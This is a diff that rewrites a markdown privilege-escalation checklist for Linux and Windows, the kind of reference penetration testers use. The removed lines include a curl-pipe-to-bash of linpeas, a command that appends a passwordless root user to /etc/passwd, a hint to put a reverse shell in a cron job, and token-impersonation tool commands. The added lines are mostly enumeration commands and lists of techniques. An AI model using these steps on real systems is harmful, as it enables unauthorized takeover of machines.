@@ -1,137 +1,260 @@
 # ⬆️ Privilege Escalation Checklist
 
-Run these in order. Stop when you find something.
+## Linux Privilege Escalation
 
----
-
-## 0. Auto-Enumerate First
+### Information Gathering
 
 ```bash
-# Linux
-curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash
-
-# Windows
-# Upload winpeas.exe, then run it
+whoami
+id
+uname -a
+uname -r
+lsb_release -a
+cat /proc/version
+hostname
 ```
 
----
+### Sudo Permissions
 
-## Linux Checklist
-
-### 1. Who am I?
-```bash
-id; whoami; groups
-```
-
-### 2. Sudo permissions
 ```bash
 sudo -l
-# → Look for NOPASSWD entries → google "GTFOBins <binary>"
+sudo -l -U username
 ```
 
-### 3. SUID binaries
+### SUID Binaries
+
 ```bash
 find / -perm -4000 2>/dev/null
-# → Check each at gtfobins.github.io
+find / -type f -perm -u=s 2>/dev/null
 ```
 
-### 4. Cron jobs
+### SGID Binaries
+
 ```bash
-cat /etc/crontab
-ls /etc/cron.d/
+find / -perm -2000 2>/dev/null
+find / -type f -perm -g=s 2>/dev/null
+```
+
+### World-Writable Files
+
+```bash
+find / -writable 2>/dev/null | head
+find / -type f -perm -o+w 2>/dev/null
+```
+
+### Cron Jobs
+
+```bash
 crontab -l
-# → Writable script? → replace with reverse shell
+cat /etc/crontab
+ls -la /etc/cron*
+grep -r "" /var/spool/cron/
 ```
 
-### 5. Writable files owned by root
-```bash
-find / -writable -user root 2>/dev/null | grep -v proc
-```
+### Capabilities
 
-### 6. Kernel version → known exploits
-```bash
-uname -r
-# → searchsploit "Linux Kernel X.X" or Google CVE
-```
-
-### 7. Capabilities
 ```bash
 getcap -r / 2>/dev/null
-# → cap_setuid = instant root
 ```
 
-### 8. Passwords in files
+### Environment Variables
+
 ```bash
-grep -r "password" /etc/ /var/ /home/ 2>/dev/null
-grep -r "password" /var/www/ 2>/dev/null
-cat ~/.bash_history
 env
+echo $PATH
+echo $LD_LIBRARY_PATH
 ```
 
-### 9. Writable /etc/passwd
+### Services Running as Root
+
+```bash
+ps aux | grep root
+ps -ef | grep root
+```
+
+### Installed Software
+
+```bash
+apt list --installed 2>/dev/null
+rpm -qa
+yum list installed
+```
+
+### Network Connections
+
+```bash
+netstat -tulpn
+ss -tulpn
+ss -tan
+```
+
+### File Permissions
+
 ```bash
 ls -la /etc/passwd
-# If writable: echo 'root2::0:0::/root:/bin/bash' >> /etc/passwd
-# then: su root2
+ls -la /etc/shadow
+ls -la /root
 ```
 
-### 10. Internal ports / services
+### Kernel Exploits
+
 ```bash
-ss -tulpn
-# → Port open only internally? → exploit locally
+uname -r
+searchsploit kernel
 ```
 
 ---
 
-## Windows Checklist
+## Windows Privilege Escalation
 
-### 1. Who am I?
-```cmd
-whoami /all
-net user %username%
+### System Information
+
+```powershell
+whoami
+whoami /priv
+whoami /groups
+systeminfo
+net user
+net localgroup administrators
 ```
 
-### 2. Unquoted service paths
-```cmd
-wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"
+### Hot Fixes (Patches)
+
+```powershell
+wmic qfe list full
+wmic qfe list full format=list
 ```
 
-### 3. Weak service permissions
-```cmd
-accesschk.exe -uwcqv "Everyone" * /accepteula
-accesschk.exe -uwcqv "Users" * /accepteula
+### Installed Software
+
+```powershell
+wmic product list brief
+wmic product get name
+Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*
 ```
 
-### 4. AlwaysInstallElevated
-```cmd
-reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
-reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
-# Both = 1 → instant SYSTEM via .msi exploit
+### Running Services
+
+```powershell
+wmic service list brief
+tasklist /svc
+Get-Service
 ```
 
-### 5. Stored credentials
-```cmd
-cmdkey /list
-# → runas /savecred /user:admin cmd.exe
+### Weak File Permissions
+
+```powershell
+icacls C:\Program Files\*
+icacls C:\ProgramData\*
 ```
 
-### 6. Token impersonation
-```
-# If SeImpersonatePrivilege → run PrintSpoofer or GodPotato
-PrintSpoofer.exe -i -c cmd
-GodPotato.exe -cmd "cmd /c whoami"
+### Unquoted Service Paths
+
+```powershell
+wmic service get name,displayname,pathname,startmode
+sc qc servicename
 ```
 
-### 7. Passwords in common places
-```cmd
-findstr /si "password" *.xml *.ini *.txt *.config
-reg query HKLM /f password /t REG_SZ /s
+### Registry
+
+```powershell
+reg query HKLM\Software\Microsoft\Windows\Run
+reg query HKCU\Software\Microsoft\Windows\Run
+```
+
+### Scheduled Tasks
+
+```powershell
+tasklist /v
+Get-ScheduledTask
+```
+
+### Network Configuration
+
+```powershell
+ipconfig /all
+route print
+netstat -ano
+```
+
+### UAC Status
+
+```powershell
+reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System
+Get-MpComputerStatus
+```
+
+### Credential Manager
+
+```powershell
+credman.exe
+vaultcmd.exe /list
+```
+
+### Active Directory Enumeration
+
+```powershell
+net user /domain
+net group /domain
+net group "Domain Admins" /domain
+Get-ADUser -Filter *
+Get-ADGroup -Filter *
 ```
 
 ---
 
-## Key Resources
+## Common Exploitation Methods
 
-- [GTFOBins](https://gtfobins.github.io/) — Linux SUID/sudo exploits
-- [LOLBAS](https://lolbas-project.github.io/) — Windows living-off-the-land
-- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) — everything
+### Linux
+
+1. Sudo misconfiguration (NOPASSWD)
+2. SUID binaries (strings, find, nano, vim, less)
+3. Cron job manipulation
+4. Library injection
+5. Capabilities abuse
+6. Kernel exploits
+7. Docker/Container escape
+8. Weak file permissions
+
+### Windows
+
+1. Unquoted service paths
+2. Weak service permissions
+3. DLL hijacking
+4. Registry manipulation
+5. UAC bypass
+6. Token impersonation
+7. Kerberoasting
+8. Potato exploits (Hot/Rotten)
+9. Scheduled task abuse
+10. Weak file permissions
+
+---
+
+## Automated Tools
+
+### Linux
+
+- LinPEAS
+- linuxprivchecker.py
+- Unix-privesc-check
+- peass-ng
+
+### Windows
+
+- WinPEAS
+- PowerUp.ps1
+- Privesc
+- WindowsEnum
+
+---
+
+## Tips
+
+- Always check sudo permissions first
+- Look for recently modified files
+- Check kernel version for known exploits
+- Document findings with evidence
+- Test exploits in safe lab environment
+- Use multiple tools for verification
+
